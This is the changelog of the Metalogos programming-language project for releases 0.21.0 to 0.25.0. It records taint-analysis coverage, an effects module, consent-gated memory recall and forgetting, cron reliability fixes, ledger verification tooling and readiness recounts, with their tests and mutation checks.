# Changelog

All notable changes to the Metalogos project.

## [Unreleased]

_Nothing yet — the next wave boundary recomputes REALITY under the same protocol._

## [0.25.0] - 2026-09-25

### Wave 15 (issues #656–#659, dispatch #660 — the static contour of Phase 1: full statement-kind inference + the effects module; the honest recount; this release)

- **TAINT_INTERP full statement-kind coverage (naryad #448, issue #656)**: REALITY §2.2 was "9 of 15" — the interprocedural taint engine's walkers skipped `Match`/`Break`/`Continue` and the Memory variants (`Memorize`/`Forget`/`Relate`). The flat expression collector is replaced by a **state-aware walker**: bindings carry lattice-projected labels (the ADR-0154 §5 projection — no new lattice), merges across match arms and loop exits use the existing lattice join (`Label::join`, 2.3), `break`/`continue` are flow boundaries (the point state joins the loop-exit merge; dead code after the boundary cannot clean the state), a `return` inside a match arm marks summary params (may-union), and the Memory variants arm persist-facts — a keyed `memorize(<key>, <llm>)` arms the key prefix (the №386/№405 vocabulary), the key-less statement form arms the conservative any-write fact, and `recall()` of an armed key is an untrusted value. Newly caught (all compiled clean before the naryad): sinks inside match arms (incl. `write_file` chains the clearance bridge does not gate), taint carried out of loops through `break`/`continue`, and memorize→recall→respond through branches — same `TAINT_INTERP` class, zero new check_ids. Leak corpus 40 → 43 negatives, 22 → 25 positives (`ok_448_*` pin zero false positives on every new kind); overhead at depth 4 on the leak corpus **+6%** vs the pre-naryad binary (the №376 threshold is +50%); mutation ≥2/2 VERIFIED (M1 the walker arm-merge + the summary union; M2 the break/continue exit collection — `scripts/mutation_verify_448.sh`, 4/4 killed).
- **The static effects module (naryad #449, issue #657)**: REALITY §2.4 was NO (`grep 'effect' src/audit.rs` empty). Effect attributes {read, write, network, irreversible} on builtin calls are derived SOLELY from the №316 classification (read ← Role::Source, write ← Role::Sink, network ← Label::Network, irreversible ← Reversibility::Irreversible) — no second markup; the derivation is total over the registry (the SSOT coverage test catches classification drift). Effect-TRACE: interp taint events and the TAINT_PERSISTENCE/TAINT_PASSTHROUGH findings carry `(effects: ...)` in the audit output. Severity ESCALATION on the network axis: a tainted argument reaching a `Label::Network` builtin — incl. the №316 DUAL prompt-egress of `call_llm` (`call_llm(poisoned)` compiled clean before the naryad) — is a TAINT_INTERP error in the EXISTING category (no new check_id, no new lattice). Anti-collision pins: the write-only Internal lanes (memorize/db) stay with TAINT_PERSISTENCE/clearance; mutation ≥2/2 VERIFIED (`scripts/mutation_verify_449.sh`, 3/3 killed: M1 the irreversible SSOT mapping; M2 the network escalation — unit + corpus).
- **The Wave-15 recount, part 1 (naryad #450, issue #658)**: REALITY §6.10 on main `2b062513` — Labels 75 → **87%** (two of the four named gaps closed: №448 full static-engine inference §2.2 15/15; №449 the effects module §2.4; arithmetic 25pp / 4 gaps ≈ 6.25pp each, +12.5pp, rounded down); Capability 88 / Backend 88 / Ledger 95 / Memory 70 unchanged (each with proof commands); **82% → 85%**; the README P0 anchor synced; PLAN-SUMMARY carries the public waves 0–15 status table.

## [0.24.0] - 2026-09-24

### Wave 14 (issues #649–#651, dispatch #652 — the forgetting memory: forget, poison, decay/boost/retain-ttl; the honest recount; this release)

The wave ran on top of the Wave-13 recall front door with the builtin registry at 499 and the P0-readiness anchor at 80%. The memory line moved to the canon §10.3 forgetting semantics: **the registry grows 499 → 500** (`memory_retain_ttl` appended at the end — the .mbc index contract; the stub-spec set shrinks 24 → 23), the static check_id vocabulary grows 33 → 35, and the P0-readiness anchor moves 80% → 82%.

- **The forgetting front door (naryad #445, issue #649, PR #653 → `3dae2e51`)**: `forget(handle, key, grant, dry_run?)` is a REAL handler (the stub-spec row is gone; zero stub-spec on the name) — the ADR-0155 linear action over the typed `Memory<K>` lane with the fail-closed refusal ladder: the consent gate (`MEMORY_FORGET_CONSENT_REQUIRED`, the №413 convention), the grant ladder (GRANT_MISSING / GRANT_INACTIVE / GRANT_SCOPE_MISMATCH — scope `memory:forget:<container>`, the grant consumed on success only), the retained VETO (`MEMORY_RETAIN_PROTECTED`); every refusal is a `memory.forget.denied` ledger record and touches nothing. `dry_run=true` previews {closure, would-poison} without state change or grant consumption (the №280 preview discipline). Apply deletes the ROOT (soft — the ledger carries the content digests, never the content) and POISONS the derived closure: poisoned survivors stay in the container but cannot materialize into any sink — `memory_read`/`memory_export` refuse with the typed `MEMORY_POISONED` stamp and the recall lane skips the quarantine. Ledger: `memory.forget` {container, targets, hashes, dry_run fact} + `irreversible.memory_forget` on apply. Consent revocation (`consent_revoke` on `memory:<subject>`) fires the SAME cascade over the subject's private containers — everything poisoned, nothing deleted (the №442 fail-closed gate evidence stays intact; a re-grant never resurrects the data).
- **decay/boost/retain(ttl) in the typed lane (naryad #445)**: the ACT-R activation product (base × priority × exp(−decay_rate × full days stale) — day-granularity keeps the №442 recall scores byte-exact) orders the typed recall; every access boosts the entry (last_access refresh, persisted); `memory_put` arity 3..5 with the opts Struct `{priority?, decay_rate?, ttl_secs?}`; `memory_retain_ttl(handle, key, ttl_secs)` is the canon retain(memory, ttl) — past the deadline the sweep auto-forgets the entry on the next read/keys/recall touch (the №280 "v2" deferral lifted; the expiry recorded as `memory.ttl_expired` {container, keys, hashes}); the activation/quarantine attributes persist through an additive side table (`memtyped_entry_attrs` — CREATE IF NOT EXISTS, no alters, ADR-0060).
- **The wave 14 recount (naryad #446, issue #650, PR #654 → `be8f8593`)**: REALITY §6.9 on main `3dae2e51` — Memory 60→70 (the THIRD of the four named gaps closed: decay/boost are no longer legacy-lane only; the second front door is real; the canon TTL exists; the sweep lifted the "v2"; the ONLY remaining named gap of the row is the plan-v2 memory contract — a decision gap, not a code gap), Labels 75 / Capability 88 / Backend 88 / Ledger 95 unchanged (each with proof commands); **80% → 82%**; the README P0 anchor synced.
- **This release (naryad #447, issue #651)**: the version-discipline checklist — Cargo.toml = README badge = CHANGELOG = git tag `v0.24.0` = GitHub Release; the changelog carries only what actually landed in main.
- **Contract tests**: `tests/naryad_445_memory_forget.rs` — 13 tests green; mutation ≥2/2 VERIFIED (protocol №382: M1 — the grant ladder removed is caught; M2 — the poison gates removed are caught by 3 tests); TW/VM parity green on the granted surface and on the legacy `forget(query, days?)` form (№72); CI blocking 23/23 green on the PR heads and the merge commits.
- **Boundaries**: no physical deletion (the soft-delete discipline №280/ADR-0173 holds; the ledger is append-only per ADR-0167); private content never crosses the consent boundary; find/inspect remain stubs (named, out of scope); no plan-v2 memory contract in the repository; no export/HTTP forget surface; the static poison lattice stays in the P2 park.

## [0.23.0] - 2026-09-24

### Wave 13 (issues #642–#644, dispatch #645 — the memory front door «recall», the honest recount, this release)

The wave ran on top of the Wave-12 forecast domain with the builtin registry at 499: the recall front door of memory (№442 — the last registry stub is gone: a real, consent-gated, provenance-bearing, ledgered handler over the typed lane and the hybrid store engines), the waves 12–13 recount (№443 — REALITY §6.8 on main `8c6256fa`: Memory 45→60, Backend registry 85→88, Labels/Capability/Ledger unchanged — 76% → 80%, every movement reproducible by recorded proof commands; the README P0 anchor synced), and this release (№444 — the version-discipline checklist: Cargo.toml = README badge = CHANGELOG = git tag `v0.23.0` = GitHub Release; the changelog carries only what actually landed in main; the stale duplicated `## [Unreleased]` heading — the wave-9 detailed entries already shipped in 0.22.0 — is correctly attributed to that release).

### Wave 12 (issues #635/#636 — the forecasting domain)

The forecasting domain landed on the №336 ladder mechanics (registry 494 → 499, append-only): the `timeseries` class with the opaque `SeriesHandle`/`ForecastHandle` (№440 — the ladder `timesfm-2.5 → statsforecast → seasonal_naive`: the Apache-2.0 weights pin `google/timesfm-2.5-200m-pytorch` (TimesFM 3.0 is non-commercial — PINNED NEVER), the pure-software Apache rung (no weights artifact — nothing to fetch or pin), the built-in deterministic leg; every rung step is loud; the export sink-gate `FORECAST_TAINTED` — a tainted series never leaks its forecast; the ledger family `forecast.series_make`/`forecast.run`/`forecast.denied`/`forecast.pull_denied`), and the red/green example line (№441 — `examples/w12_forecast_ladder.mlog` + `.expected`, the mutation harness on the sink-gate and the degraded flag, the README examples counter 257→258).

### Wave 11 (issues #629–#632, dispatch #633 — the audit 2026-09-23 live remains + the office waker + the example line)

The wave ran on top of 0.22.0 with the builtin registry UNCHANGED (494 — the wave's substance is infrastructure and evidence, not language surface): the office waker moved into the public repo (№435 — `.github/workflows/waker.yml` on GH-hosted `ubuntu-latest`, schedule `*/10` + dispatch, prod `/health` ping BLOCKING, staging non-blocking, `permissions: {}`; the office's dead self-hosted schedule demoted by the paired FO-051 in FOSVED-office-v2), the embodied monitor-bypass example line (№436 — `examples/w11_embodied_bounds.mlog`: `chunk_make` without bounds refuses typed `EMBODIED_UNBOUNDED`, every WorldState materialization surface refuses `WORLD_STATE_PRIVATE`, the bounded green leg seals and verifies the honest PENDING proof; `scripts/mutation_verify_436.sh` — both bypass mutants killed, 2/2; contract test `tests/naryad_436_embodied_examples.rs`), the audio consent dogfood (№437 — `examples/w11_audio_consent.mlog`: speak/listen without a grant refuse typed `AUDIO_CONSENT_REQUIRED` with the ledger delta exactly 1 (`duplex.*_denied`), the granted legs run the full audited open→start→stop cycle, revocation re-arms the gate; the office voice-path adaptation contract (4 rules) lives in the example header), and this post-wave doc sync (№438: CHANGELOG/README counters/REALITY recount §6.7).

### Wave 10 (issues #612–#619, dispatch #620 — the audit 2026-09-22 + the Phase-5 start «Embodied, sim-only»)

The wave landed on top of 0.22.0: the audio consent gate (№428 — speak/listen require an active `audio.speak`/`audio.listen` grant, fail-closed, audited, try-stamped), the memory office-path integration contract (№429 — the pinned end-to-end office scenario; the dogfood №395 path), the duty/session origin stamps (№430 — `SESSION_UNKNOWN`/`SESSION_CONTRACT` position-0, ADR-0172 Implemented), ADR-0159 sim-first (№354 — SafetyBounds as an STL-formula monitor; the carrier-independent semantics), the embodied type surfaces (№355 — the seven opaque handles over the sim-only contour; registry 484→494; the WorldState private-materialization refusal), and this post-wave doc sync (№434: CHANGELOG/README/limitations/REALITY recount).

### Changed

- **The waves 12–13 recount — P0 readiness 76% → 80% (naryad #443, issue #643)**: REALITY.md §6.8 on main `8c6256fa` — the same UNVERIFIED decomposition and weights (plan v2 is still absent), readiness per code facts only: Memory 45% → 60% (two of the four named gaps closed by №442 — the real recall front door and the FTS5-recall lane integrated with the typed lane; decay/boost remain legacy-lane only, the plan-v2 memory contract unknown), Backend registry 85% → 88% (the FIRST ladder class with real in-tree execution — the `timeseries` class №440; the deterministic and pure-software rungs run in CI, the neural rung stays behind its pin), Labels 75% unchanged (the new gates are RUNTIME origin-stamps on new surfaces; the static contour unchanged — 33 unique check_ids), Capability 88% unchanged (the №442 gate rides the existing №413 convention), Ledger 95% unchanged (record-family growth, not structural). Still NOT a P0-green claim; the README P0 anchor synced (80% as of naryad #443). Every movement carries its proof command in §6.8.
- **The release-discipline checklist (naryad #444, issue #644, the audit 23.09 P0-1 residue)**: the five version places are consistent (Cargo.toml = README badge = CHANGELOG = git tag `v0.23.0` = GitHub Release); the changelog carries only what actually landed in main — and the stale duplicated `## [Unreleased]` heading (the wave-9 detailed entries already shipped in 0.22.0, sitting between [0.21.0] and [0.20.1] since the №427 release) is retitled to its release; docs_consistency/readme version guards green.
- **The duty/session refusals are origin-stamped (naryad #430, issue #616)**: unknown/ended session refusals carry the position-0 `[SESSION_UNKNOWN]` stamp, the closed-vocabulary violations (unknown wake source §4.1, unknown interrupt priority §4.2) carry `[SESSION_CONTRACT]` — the `try` classifier branches the office's session policies on the subsystem, never on message text (the №413 convention, never double-stamped). ADR-0172: Accepted → Implemented with the Evidence section; the positive duty example `examples/w10_duty_cleanup.mlog` (duty profile + the ADR-0155 grant path); the audit table (error → stamp → test) in `tests/naryad_430_duty_stamps.rs`.

### Security

- **The audio consent gate on the duplex path (naryad #428, issue #614)**: `speak_start`/`listen_start` are directed audio egress/ingress and now require an ACTIVE consent grant for their direction (`audio.speak` / `audio.listen`, recorded through the №335 consent contour `consent_grant`) — fail-closed on any store error. The refusal is typed `AUDIO_CONSENT_REQUIRED` (the №413 origin-stamp convention, `try`-branchable) and is itself a ledger record (`duplex.speak_denied` / `duplex.listen_denied`) — no silent egress AND no silent refusal. Revocation re-arms the gate; the barge-in state machine (№352/ADR-0174) is untouched. threat-model: the audio section; limitations: the runtime-gate boundary; tests `tests/naryad_428_audio_consent.rs` (T1–T6 incl. TW/VM `try` parity); mutation 2/2 (`M-CONSENT-GATE`, `M-LEDGER-EGRESS`, `scripts/mutation_verify_428.sh`).

### Added

- **The recall front door of memory (naryad #442, issue #642)**: the last registry stub is gone — `recall` is a real handler (`spec!("recall", 1, 2, "memory"; builtin_recall)`; the registry-level handler serves the typed lane as the generic fallback), and the shared engine (`src/memory_typed.rs`) wires the store lanes into the typed lane: the hybrid FTS5 BM25 + cosine RRF fusion on SqliteStore, the all-entries scan on InMemoryStore, the old full-scan `recall()` kept as the safety net, the threshold preserving the store's activation semantics (sim × priority × decay) — the external store contract is regression-pinned (the m4 golden, DoD, crosscheck). The №413 consent contract is fail-closed: a query that names gated private memory without an active grant refuses typed `MEMORY_RECALL_CONSENT_REQUIRED` (whitelisted for `try`) and the refusal IS a `memory.recall.denied` ledger record — the gated content is never read, not even internally (key-list metadata only). Typed hits carry the `[MEM]` provenance suffix (container / subject / label / time / the taint projection via the №322 lattice and LabelJoin, derived-from parents included); every recall records `memory.recall {query hash, containers, hits, consent fact}` (№393/ADR-0167). The static companions are Category-A compile errors on every path: `RECALL_QUERY_INVALID` (a literal non-String query) and `RECALL_CONFIDENCE_INVALID` (a literal `min_confidence` outside 0.0..=1.0). The VM keeps its honest simple-memory store lane (the bug #530 twin) and shares the typed lane, the gate, the suffix and the ledger by construction. Tests `tests/naryad_442_memory_recall.rs` + `tests/bug_530_vm_recall_parity.rs`; mutation ≥2/2 VERIFIED (the consent-gate bypass, the provenance substitution); REFERENCE regenerated (memory 36, stub 25 — the recall row is the real handler); limitations carries the four №442 boundaries.
- **The forecasting domain — `SeriesHandle`/`ForecastHandle` over the `timeseries` class (naryad #440, issue #635)**: five new builtins over the new registry class `timeseries` (registry 494→499 append-only): `series_make(source, frequency?)` (an opaque handle over a stored numeric series; the taint of the source travels through the handle), `series_pull(grant, source)` (the grant-gated external pull — an ungated external source is a design error, not a degraded mode), `forecast_next(handle, horizon)` (the ladder run: the top rung's model runs when the weights are present, the ladder degrades LOUDLY — every step records the rung, the pin and the `degraded` flag, the `[Forecast]` marker instead of content on degraded paths), `forecast_state(handle)` / `forecast_points(handle)` (read-only introspection of the ForecastHandle). The export sink-gate `FORECAST_TAINTED` (the №413 origin-stamp convention): a tainted series never leaks its forecast — the refusal is typed, `try`-branchable, and itself a `forecast.denied` record; the ledger family `forecast.series_make`/`forecast.run`/`forecast.denied`/`forecast.pull_denied` carries hash-bearing details (№393/ADR-0167). The ladder pin: `google/timesfm-2.5-200m-pytorch` (Apache-2.0); TimesFM 3.0 ships a non-commercial license — PINNED NEVER.
- **The forecast red/green example line (naryad #441, issue #636)**: `examples/w12_forecast_ladder.mlog` + `.expected` (the real binary run, the golden pinned byte-for-byte by `tests/naryad_441_forecast_examples.rs`): the RED leg makes a series from a tainted source and proves the typed export refusal (`FORECAST_TAINTED` + the `forecast.denied` ledger delta, branching on `error.code` per the №413 convention); the GREEN leg forecasts a clean series along the ladder — in CI the deterministic rung (no network/model), the prov block visible (rung/degraded), the quantiles in `forecast.run`. Mutation harness ≥2/2 (the sink-gate bypass, the degraded-flag substitution — `scripts/mutation_verify_441.sh`, the mutants out of the commit); the README examples counter 257→258.
- **The embodied type surfaces (naryad #355, issue #618)**: the Phase-5 «Embodied, sim-only» contour lands its seven opaque handles — `Device`/`WorldState`/`ActionChunk`/`Pose`/`Trajectory`/`GoalPredicate`/`Proof` (ADR-0159: the bounds formula is private-by-default device state, digests only outside the contour; an ActionChunk is UNMAKABLE without a bounds formula on the device profile — typed `EMBODIED_UNBOUNDED`, no unmonitored action; the Proof is the signed `{hash(world), chunk, bounds, telemetry-digest, verdict, hash(sim)}` trace, the stage-A verdict is PENDING by construction — no program-forged "satisfied" — and verify checks the CONTRACT FIELDS only, execution is №356 behind the GPU-budget gate). WorldState materialization (`print`/`to_string`/`json_encode`) refuses typed `WORLD_STATE_PRIVATE` with an audit record on every surface (the №349 duty-rule consistency); the `embodied-sim` backend class joins BACKEND_REGISTRY with two in-tree sim records (nothing to fetch or pin — the honest `PendingNo334`); registry 484→494; the golden `examples/w10_embodied_sim.mlog`; tests `tests/naryad_433_embodied_handles.rs` / `naryad_433_world_state_private.rs` / `naryad_433_proof_contract.rs` (TW/VM parity incl.).
- **The memory office-path integration contract (naryad #429, issue #615)**: the end-to-end office scenario through the language surface — session_login → consent-granted `memory_open<private>` → put with derived-from provenance → audited read (the private payload stays sealed; redact is the sanctioned egress) → cascade preview → the Once-grant spend on the irreversible `memory_forget_cascade` (ADR-0155) → derived gone, independent intact; the Action Ledger records every step (`memory.put` / `memory.read` / `memory.cascade_preview` / `memory.forget_cascade`). limitations.md: the static-boundary row (the taint contour sees Memory<K> entries as sealed values; the cascade graph is a runtime fact). Tests `tests/naryad_429_memory_office_path.rs`; mutation 2/2 (`M-CASCADE-LEDGER`, `M-CONSENT-PATH`, `scripts/mutation_verify_429.sh`).

## [0.22.0] - 2026-09-22

### Added

- **Phase 4 surfaces — «Always-on, память, забывание» (Wave 9, issues #591–#597)**: the real session surface (№348/ADR-0172: wake/interrupt ladder, duty enter/exit, SESSION_UNKNOWN fail-closed), the duty-profile compile rule (№349: private materialization and network sinks are compile errors in the duty profile), typed `Memory<K>` with consent-gated private storage and audited sink reads (№350), the derived-from graph with grant-gated cascade forget over a persistent rusqlite store (№351/ADR-0173), directed audio effects + duplex with barge-in over the session ladder (№352/ADR-0174), the tick context (№426/ADR-0175: cron dispatch executes in the program context — `db{}` binding, loud http self-call diagnostics, sqlite isolation decision, schema DDL replication), and the post-wave doc sync (№425: REFERENCE 4.17.3 drift fix, REALITY recount 76%). Registry 461→484; mutant verifications: №426 2/2 (M-CRON-BIND, M-SCHEMA-REPL); serve-soak №423 11/0.

### Fixed

- **`try` string projection restored to the 0.19 contract (issue #602, ADR-0142 addendum)**: `to_string(try X)` in 0.21.0 rendered the full `TryResult {ok, value, error}` struct dump on both paths — the office migration idiom `let x = try f(); if to_string(x) == "()" { fallback }` was broken in both branches (~570 try-sites). The `Value` Display projection of a TryResult now renders only the `value` field: success → the inner value (0.19 transparency), failure → `()` (the `value` field is Unit on the error path) — the exact contract of the office's verified `TryVal(x) = x.value` workaround. The structural contract (№374/ADR-0142) is untouched: `.ok` / `.value` / `.error.code` / `.error.message` keep working on both backends, and the stable error codes (№385/ADR-0169) live in the `error` field. REFERENCE §try documents the projection; parity tests in `tests/naryad_602_try_to_string_transparency.rs`.
- **route-body assignment in branches restored to TW/VM parity (issue #600)**: the TW route executor (`execute_route_body`) handled top-level route statements manually and delegated nested blocks to `eval_statements`, which creates a fresh mutability set — an assignment to a `let mut` route local inside an `if`/`each` branch failed at runtime with "cannot assign to immutable variable" → HTTP 500 (the VM compiles the same program fine: mutability is a compile-time fact since №264, branch assigns compile to `StoreAssignLocal { mutable: true }`). The executor now threads ONE `mutable_vars` set through the whole route body (`Interpreter::eval_statements_with_mutability`), registers the `mutable` flag of top-level and branch `let` bindings, and rejects assignments to non-mut locals with the same loud error the pattern bodies use — no silent overwrite (№264 parity). Contract tests `tests/naryad_431_route_mut_context.rs` (branch assign, each-body assign, top-level reassign, non-mut loud error); mutation verification 2/2 (M1 registration neutered, M2b branch threading neutered — each killed by the named test).

## [0.21.0] - 2026-09-21

### Added

- **Native cron reliability — the scheduler the office can actually run on (naryad #418, issue #571)**: the owner directive («Я хочу полноценный cron-job в Металогос… задания должны выполняться по времени и дате») made the native cron the office's ONLY scheduler (Wave 7: №419 integration, №420 external-runner removal); six defects blocked it, and this release fixes all six with the tick architecture preserved (5s tokio loop, Phases 1-2-3). **D1 dedup window**: every matched window fires AT MOST once — the window identity is the start of the matched wall-clock minute in the job's timezone, the dedup stamp (`last_window`) is persisted in the job store and idempotent across restarts and manual `cron_run` fires (the pre-№418 bug re-fired a matched minute every 5s tick — up to 12 fires/minute). **D2 catch-up**: windows missed while the process was down follow the per-job `catch_up` policy — `run_once` (default: all missed windows coalesce into ONE fire at the next tick) or `skip` (missed windows are consumed without firing; the next regular window fires normally). **D3 timezone**: per-job IANA timezone (optional `cron_add` argument; default env `MLOG_CRON_TZ`, else UTC) — the windows are matched IN the job's zone (`cron_expr_matches` used `chrono::Local`, breaking Europe/Moscow schedules on a UTC host); `cron_list` surfaces `next_run`/`last_run` both as epoch seconds and as ISO strings in the job's own zone (`next_run_tz`/`last_run_tz`). **D4 payload**: an optional fixed payload (a DATA string) handed to the target builtin/pattern as its single String argument — the dispatch surface does NOT expand (only the registered target is called; no spawn/exec; the payload is never interpreted as code; zero-arg signatures unchanged). **D5 reminder delivery**: due reminders are delivered to the same dispatch surface as cron jobs (the `ReminderCheck` pattern, if defined — `(message, data, type)`), the eprintln journal stays, and a failing handler is stamped `CRON_JOB_FAILED` (the №413 stamps hold on every fail path). **D6 doc-drift**: `cron_list` surfaces `last_run` (the REFERENCE claimed it, the code did not return it — closed) plus the new fields; REFERENCE §4.17.3 rewritten. The fire decision is a PURE function (`cron_fire_decision`) — dedup, catch-up and TZ are pinned by tests against ONE implementation; the store migration 0.20.x → 0.21.0 is additive (old job JSONs default: tz env/UTC, run_once, no payload, never fired) and pinned by a test. Tests `tests/naryad_418_cron_reliability.rs` (9 — dedup window, restart idempotency, catch-up run_once/skip, the Moscow-vs-UTC identity, the env default + loud unknown TZ, payload args, the reminder delivery contract incl. the stamp, the store migration + cron_list surfacing through the language surface, the loud cron_add validation). Mutation verification (№382 protocol, `scripts/mutation_verify_418.sh`): M-TZ (the per-job zone resolution neutered) and M-DEDUP (the last-window guard neutered) each kill their named test — 2/2 VERIFIED. The registry arity of `cron_add` widened additively 2 → 2..5 (.mbc-safe: an existing 2-arg call stays valid).

- **The runtime `ledger_verify()` hook — structural ledger verification (naryad #415, issue #567, the audit P2-2 residue of №393)**: integrity verification existed only as a library call with STRING errors (the fault position had to be guessed out of the message text) plus a human-output CLI; the hook closes the gap with three surfaces over ONE crypto implementation (the ADR-0167 §3.6 checks were refactored into `verify_records_structural` — the public `verify_records` keeps its string facade byte-for-byte, nothing about the wire format or the primitives changed). Library: `ledger_verify(source, expect_head, expect_key) -> LedgerVerdict` — the deterministic STRUCTURAL verdict (`ok`, `schema_version`, `records`, `head_hash`, `distinct_keys`, `anchored_start`, `fault{record: 1-based position | null, reason}`); sources `LedgerVerifySource::Jsonl(&str)` and `::File(&Path)` — read-only, the hook never writes. Builtin: `ledger_verify(path)` (1 arg, classed Source/Internal/Pure — ingress of the exported chain for verification, never egress; sandboxed read per №131/№254: a missing file is a soft `ok=false` "cannot read" verdict, a sandbox escape stays a loud `[SANDBOX_VIOLATION]`) handing the verdict to scripts as a struct (`ok`, `records`, `head_hash`, `distinct_keys`, `anchored_start`, `error_record` (1-based Float, or Unit when the fault is chain-level or absent), `error_reason`); registry 460→461 append-only (.mbc CallBuiltin indices stable). CLI: `mlog ledger verify --json` — the machine-readable verdict line for the external verifier (the office dogfood consumer), exit codes unchanged (0 = ok, 1 = fault). The documented debatable case: an EMPTY ledger verifies vacuously as `ok` (nothing in it contradicts) — the honest caveat is the ADR-0167 §7 out-of-band anchor: with `expect_head`/`expect_key` pinned, an empty chain fails loudly, which is exactly the wholesale-deletion catch. Tests `tests/naryad_415_ledger_verify.rs` (11 — happy path on both sources, body bit-flip at its record, deletion seq-gap, flipped signature (the M-SIG killer), the RE-LINK attack (prev_hash swapped + recomputed + re-signed with the correct key) caught ONLY by the linkage (the M-LINK killer), rotation seam + stale-signer continuity, archive junction anchored start, the empty-ledger documented case, wholesale deletion vs the head anchor, the builtin on BOTH backends (valid / tampered / missing), the JSON verdict shape). Mutation verification per the №382 protocol (`scripts/mutation_verify_415.sh`, throwaway worktree + shared target dir): M-SIG (the signature check neutered) and M-LINK (the prev-hash linkage neutered) each kill their named test — 2/2 VERIFIED. REFERENCE regenerated (the builtin row); limitations: the new Action Ledger section pins the read-only/anchor-less boundary.

- **`mlog serve` default backend flipped to the VM (naryad #404 Stage 5, issue #527, ADR-0171 + ADR-0141 Addendum 7)**: the owner's flip decision («Флипай», 2026-09-21) on the re-gate №3 evidence — 3/3 GREEN on BOTH thresholds (p95 ×3.00/×3.49/×3.11 ≥ ×1.5; peak RSS ×0.95/×1.07/×0.98 ≤ ×1.1; main @ `5f9da64`, rounds=30, divisor 14 declared before the runs; claim `w6: n415-claim` 5752763580, verdict `w6: n415-verdict` 5752838305). Absent `METALOGOS_SERVE_BACKEND` now selects the bytecode VM (loud startup line with the decision trace); `=interpreter` is the explicit opt-out (ADR-0141 D7 — TW remains the guaranteed full-language backend); unknown values fall back to the VM default with a loud WARN. The №40 env tests are flipped to the new contract (`test_n40_backend_env_default_is_vm`, unknown-fallback); the docs-consistency newcomer contract now pins the flipped default ("VM by default" + the `=interpreter` opt-out needle). ADR-0088's status line is amended inside ADR-0171 (the D6 rule); ADR-0105 receives the one-line addendum (§Decision 1–4 remain in force). The VM pool stays default-OFF; the bench/soak variant selection is untouched.

- **Retained-representation compression for VM serve (naryad №417 — issued as №415 before the 2026-09-21 renumbering, issue #569, owner path A per issue #527, ADR-0141 Addendum 6)**: the re-gate №2 diagnostics (№410) left the memory gate red on a RETAINED class; this naryad shrinks exactly that class. The diagnostic (`examples/retained_diag.rs`, versioned) found 175 pattern bodies (9 243 instructions) stored INLINE in `main_code` (`RegisterPattern(CompiledFn)`) AND cloned once more into the №402 shared snapshot — `Program::patterns` was a dead, never-filled compiler field — ≈ 2.96 MB in-RAM of pure duplicate, at `size_of::<Instruction>() = 160 B` (the enum's size dictated by its fattest payloads: `FlowExec` ≈ 152 B, `RegisterLearnable` ≈ 88 B, `Const(Value)` = 104 B). The lever: the compiler now FILLS the `Program::patterns` table exactly once (pass2 order = pass1 index order) and emits the append-only `Instruction::RegisterPatternRef(u32)` (the №250/№264 append-compat precedent; old .mbc keeps loading via the legacy boxed variant + the scan fallback); the №402 snapshot becomes a zero-clone `Arc` increment over the table (`serde` `rc` feature — wire-identical to `Vec`); fat `Instruction` payloads are boxed (`Const(Box<Value>)`, `SinkCheckData`, `MakeStructData`, `FlowPipelineData`, `FlowExecData`, `MutateData`, `StoreAssignLocalData`, `LabelJoinData`, `MatchTest`, `RegisterLearnable`, legacy `RegisterPattern`) — `Box<T>` serializes exactly as `T` under bincode, so the .mbc format of every pre-existing variant is byte-identical. Result: `size_of::<Instruction>()` 160 → ≤ 32 B (pinned by a test), serve duplicate mass ≈ 0, in-RAM body mass 2 copies → 1. Lazy route-body compilation evaluated and honestly marked N/A for this gate (the Stage-4 plan hits all 14 routes every round; route bodies total ~2 KiB). The run()-path backstop: `RegisterPatternRef` with an out-of-range index fails LOUDLY (the №264 contract). Tests `tests/naryad_415_retained.rs` (7: size contract, single-copy table, zero-clone snapshot, wire round-trip, legacy fallback, loud backstop, serve-route parity). Re-gate №3 (protocol №398, thresholds unchanged) follows on the merged main; the verdict package lands in issue #527.


- **Grant-surface verification naryad (№412, issue #557, ADR-0155)**: the audit P1-1 premise ("irreversible SQL is only a prohibition, not a capability") was STALE — the grant language surface has been in main since wave 3 (`grant_issue`/`grant_subgrant`/`grant_revoke`/`grant_use`/`db_execute_with_grant`, the opaque `Value::Grant` handle, scope/TTL/quota/ledger enforcement, the static Once-linearity flow walk, the signed Action Ledger v1; REFERENCE rows §384/§1135–1146; ADR-0155 status Implemented; the refuse matrix pinned by `tests/naryad_390_grants.rs` and `tests/grant_algebra_fuzz.rs`; the red/green examples `examples/w2_grant_linear*.mlog`). What the naryad ADDED: the reproducible mutation-verification harness `scripts/mutation_verify_grants.sh` (versioned, worktree-based, per the №382 protocol) — M-SCOPE (neutering `grants::scope_covers`) makes `grant_scope_mismatch_refuses_at_runtime` fail, M-TTL (neutering the `GRANT_EXPIRED` gate) makes `born_expired_grant_refuses_with_grant_expired` fail: 2/2 VERIFIED; and the honest limitations row fixing the static/runtime boundary (scope coverage of a runtime-composed SQL string is a runtime property; the static layer covers linearity, opacity and the ungranted deny).

- **Try-code origin stamps for the cron mechanics and the MCP contour (naryad #413, issue #558, ADR-0169 §3.1 extension)**: the frozen №385 code set is EXTENDED per its own mechanics — origin stamps at position 0, never message-prose classification. **`CRON_JOB_FAILED`** (new stamp): every cron/reminder mechanics failure (arg/type refusals, the 5-field cron-expression contract, lock errors) is stamped at the builtin boundary via registry-facing wrappers in `src/builtins/cron.rs` (the helper never double-stamps an inner origin stamp). The MCP contour's EXISTING finer taxonomy (`MCP_SPAWN_FAILED`/`MCP_TIMEOUT`/`MCP_IO_ERROR`/`MCP_TOOL_ERROR`/`MCP_TOOL_NOT_FOUND`/`MCP_PROTOCOL_ERROR`/`MCP_NOT_ALLOWLISTED`) is whitelisted for the classifier instead of adding the audit's coarser `MCP_TOOL_FAILED` duplicate — the deviation is recorded in issue #558. The wrapper layer (`with_mcp_server`) no longer buries a position-0 stamp mid-message (`wrap_error_preserving_code` — handshake/op failures used to demote to `RUNTIME_ERROR`). Incremental discipline held: no code without a real consumer; unstamped paths still classify as the honest `RUNTIME_ERROR` fallback (pinned). Tests `tests/naryad_413_try_stamps.rs` (8, both backends), mutation verification `scripts/mutation_verify_413.sh` (M-CRON/M-MCP, 2/2), office branching example `examples/w5_cron_branch.mlog`, REFERENCE error-table rows.

